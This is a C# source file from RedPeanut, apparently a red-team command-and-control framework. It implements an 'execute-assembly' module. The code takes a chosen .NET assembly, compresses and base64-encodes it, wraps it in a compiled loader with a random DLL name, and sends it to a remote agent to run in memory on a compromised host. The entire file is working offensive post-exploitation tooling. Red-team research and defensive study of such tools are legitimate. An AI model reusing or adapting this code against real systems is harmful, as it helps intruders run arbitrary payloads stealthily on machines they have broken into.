//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using static RedPeanut.Utility;

namespace RedPeanut
{
    public class ExecuteAssemblyManager : IMenu
    {
        public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
        {
            { "set assemblypath", "Set path to assembly" },
            { "set args", "Set args for the assmbly" },
            { "run", "Execute module" },
            { "options", "Print current config" },
            { "info", "Print help" },
            { "back", "Back to lateral menu" }
        };

        public void RePrintCLI()
        {
            Utility.RePrintCLI(agent, modulename);
            return;
        }

        IAgentInstance agent = null;
        string modulename = "execute-assembly";
        string assemblypath = "";
        string assemblyargs = "";

        bool exit = false;

        public ExecuteAssemblyManager()
        {

        }

        public ExecuteAssemblyManager(IAgentInstance agent)
        {
            this.agent = agent;
        }

        public void Execute()
        {
            exit = false;
            string input;
            SetAutoCompletionHandler(mainmenu);
            do
            {
                input = RedPeanutCLI(agent, modulename);
                DCOMMenu(input);
            } while (!exit);
        }

        private void DCOMMenu(string input)
        {
            string f_input = ParseSelection(input);

            if (!string.IsNullOrEmpty(input))
            {
                if (mainmenu.ContainsKey(f_input.TrimEnd()))
                {
                    switch (f_input.TrimEnd())
                    {
                        case "set assemblypath":
                            assemblypath = GetParsedSetFilePath(input);
                            break;
                        case "set args":
                            assemblyargs = GetParsedSetStringMulti(input);
                            break;
                        case "run":
                            Run();
                            break;
                        case "options":
                            PrintCurrentConfig();
                            break;
                        case "info":
                            PrintOptions("info", mainmenu);
                            break;
                        case "back":
                            Program.GetMenuStack().Pop();
                            exit = true;
                            return;
                        default:
                            Console.WriteLine("We had a woodoo");
                            break;
                    }
                }
                else
                {
                    PrintOptions("Command not found", mainmenu);
                }
            }
        }

        private void Run()
        {
            string folderrpath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, TEMPLATE_FOLDER);
            List<string> args = new List<string>();

            if (!File.Exists(assemblypath))
            {
                Console.WriteLine("[x] File not found");
                return;
            }

            if (!string.IsNullOrEmpty(assemblyargs))
            {
                if(assemblyargs.Split(" ").Count() < 2)
                    args.Add(assemblyargs);
                else
                    foreach(string str in assemblyargs.Split(" "))
                        args.Add(str);
            }

            string assemblyGzipB64 = Convert.ToBase64String(CompressGZipAssembly(File.ReadAllBytes(assemblypath)));
            string source = File.ReadAllText(Path.Combine(folderrpath, EXECUTE_ASSEMBLY_TEMPLATE))
                .Replace("#COMPRESSEDASSEMBLY#", assemblyGzipB64);

            assemblyGzipB64 = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll", agent.TargetFramework, compprofile: CompilationProfile.Generic)));

            RunAssemblyBase64(assemblyGzipB64, "AssmblyLoader", args.ToArray(), agent);
        }

        private void PrintCurrentConfig()
        {
            Dictionary<string, string> properties = new Dictionary<string, string>
            {
                { "assemblypath", assemblypath },
                { "assemblyargs", assemblyargs }
            };

            Utility.PrintCurrentConfig(modulename, properties);
        }
    }
}
